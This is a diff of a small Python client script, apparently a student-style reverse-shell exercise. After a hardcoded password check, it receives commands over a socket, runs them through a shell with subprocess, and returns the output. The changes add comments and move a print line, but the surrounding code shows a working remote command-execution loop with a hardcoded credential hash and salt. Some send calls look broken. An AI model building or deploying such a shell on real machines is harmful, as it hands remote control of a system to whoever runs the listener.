@@ -9,6 +9,8 @@ CORRECT_PASS = "secGBN1BHq1FA"
 SALT = "secure_hintz"
 # client
 def main():
+
+    # Setting up connection 
     print("running client side with: " + HOST + " and " + str(PORT))
 
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -19,11 +21,11 @@ def main():
     # password
     client.send("Input your password: ".encode())
     password = client.recv(BUFFER).decode("UTF-8")
-
     password = crypt.crypt(password, SALT)
 
     # AUTHENTICATION
     if password != CORRECT_PASS:
+        # only 1 attempt else the connection closes because skill issue if mistype
         client.send("Incorrect password. Closing connection")
         client.close()
     else: 
@@ -36,14 +38,15 @@ def main():
             # getoutput returns output stdout and stderr of executing cmd in a shell
             print(command)
             if command == "":
+                # if an empty input is received, then close the connection
                 print("command is empty. Closing connection")
                 break
             try: 
                 output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                 client.send(output.encode())
             except:
-                print("uh oh spaghetti o you have an error with your input :c")
                 client.close()
+                print("uh oh spaghetti o you have an error with your input :c")
             
         client.close()
 
